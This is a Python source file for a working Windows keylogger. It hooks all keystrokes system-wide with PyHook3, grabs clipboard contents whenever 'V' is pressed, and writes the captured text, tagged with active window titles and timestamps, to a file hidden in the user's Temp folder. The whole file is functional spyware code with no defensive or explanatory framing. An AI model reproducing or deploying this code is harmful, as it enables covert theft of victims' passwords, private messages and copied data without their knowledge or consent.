import os
import time

import PyHook3
import pythoncom
import win32clipboard


class Keylogger:
    def __init__(self):
        self.hook_manager = PyHook3.HookManager()
        self.filename = os.environ['LOCALAPPDATA'] + r'\Temp\output.txt'
        self.window_name = None

    @classmethod
    def get_instance(cls):
        if not hasattr(cls, 'instance'):
            setattr(cls, 'instance', cls())
        return getattr(cls, 'instance')

    @staticmethod
    def get_time():
        return str(time.strftime('%Y-%m-%d %H:%M:%S', time.localtime()))

    def onKeyboardEvent(self, event):
        if 32 < event.Ascii < 127:
            data = chr(event.Ascii)
        else:
            if event.Key == 'V':
                try:
                    win32clipboard.OpenClipboard()
                    clipboard_data = win32clipboard.GetClipboardData()
                    win32clipboard.CloseClipboard()
                    data = event.Key + ' ' + clipboard_data
                except:
                    data = event.Key
            else:
                data = event.Key
        with open(self.filename, 'a') as f:
            if event.WindowName != self.window_name:
                self.window_name = event.WindowName
                f.write(f'\n\n[+] {self.get_time()} {self.window_name}\n')
            f.write(data + ' ')
        return True

    def start(self):
        isfile = os.path.isfile(self.filename)
        with open(self.filename, 'a') as f:
            if isfile:
                f.write('\n\n')
            f.write(f'[+] {self.get_time()} Keylogger started')
            f.close()
        self.hook_manager.KeyDown = self.onKeyboardEvent
        self.hook_manager.HookKeyboard()
        pythoncom.PumpMessages()

    def stop(self):
        self.window_name = None
        self.hook_manager.UnhookKeyboard()

    def status(self):
        try:
            return self.hook_manager.keyboard_hook
        except AttributeError:
            return False
